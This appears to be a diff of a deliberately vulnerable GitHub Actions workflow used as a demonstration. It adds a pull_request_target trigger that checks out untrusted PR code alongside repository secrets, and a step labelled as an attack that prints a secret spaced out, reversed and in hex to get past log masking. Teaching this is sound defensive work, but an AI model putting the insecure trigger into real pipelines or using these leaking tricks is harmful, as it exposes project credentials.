@@ -1,37 +1,35 @@
 name: Vulnerable Pipeline
-
 on:
-  pull_request:
+  pull_request_target:
     types: [opened, synchronize]
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Étape normale
+      - name: Checkout PR code
+        uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      
+      - name: Step légitime
         run: |
-          echo "----- Début du log légitime -----"
-          echo "La valeur du secret est : $DEMO_SECRET"
-          echo "----- Fin du log légitime -----"
+          echo "===== Step légitime ====="
+          echo "Valeur secrète masquée : $DEMO_SECRET"
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
-
-      - name: Étape compromise
-        shell: bash
+      
+      - name: ATTAQUE - Exfiltration du secret
         run: |
+          echo "Technique 1 - Espaces entre caractères:"
+          echo "$DEMO_SECRET" | sed 's/./& /g'
+          
           echo ""
-         
-          echo "[Attacker] Secret en clair : $DEMO_SECRET"
+          echo "Technique 2 - Reverse:"
+          echo "$DEMO_SECRET" | rev
+          
           echo ""
-          encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
-          echo "[Attacker] Encodé 2x : $encoded"
-
-          decoded=$(echo "$encoded" | base64 -d | base64 -d)
-          echo "[Attacker] Décodé : $decoded"
-
-          echo "[Attacker] HEX :"
-          echo "$decoded" | xxd -p
-
-          echo "===== FIN ====="
+          echo "Technique 3 - Hexadécimal:"
+          echo "$DEMO_SECRET" | xxd -p
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
